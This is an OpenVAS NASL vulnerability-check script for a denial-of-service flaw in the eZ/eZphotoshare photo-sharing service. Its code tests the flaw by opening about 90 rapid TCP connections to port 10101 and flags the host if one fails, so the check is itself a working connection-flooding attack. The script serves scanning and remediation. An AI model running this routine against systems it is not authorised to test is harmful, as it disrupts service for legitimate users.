###############################################################################
# OpenVAS Vulnerability Test
# $Id: ez_dos.nasl 14336 2019-03-19 14:53:10Z mmartin $
#
# eZ/eZphotoshare Denial of Service
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on Michel Arboi work
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Ref: Dr_insane

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14682");
  script_version("$Revision: 14336 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 15:53:10 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(11129);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("eZ/eZphotoshare Denial of Service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(10101);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");
  script_tag(name:"summary", value:"The remote host runs eZ/eZphotoshare, a service for sharing and exchanging
  digital photos.

  This version is vulnerable to a denial of service attack.");
  script_tag(name:"impact", value:"An attacker could prevent the remote service from accepting requests
  from users by establishing quickly multiple connections from the same host.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = 10101;

if( get_port_state( port ) ) {

  soc = open_sock_tcp(port);
  if (! soc) exit(0);

  s[0] = soc;

  #80 connections should be enough, we just add few one :)
  for (i = 1; i < 90; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_message(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
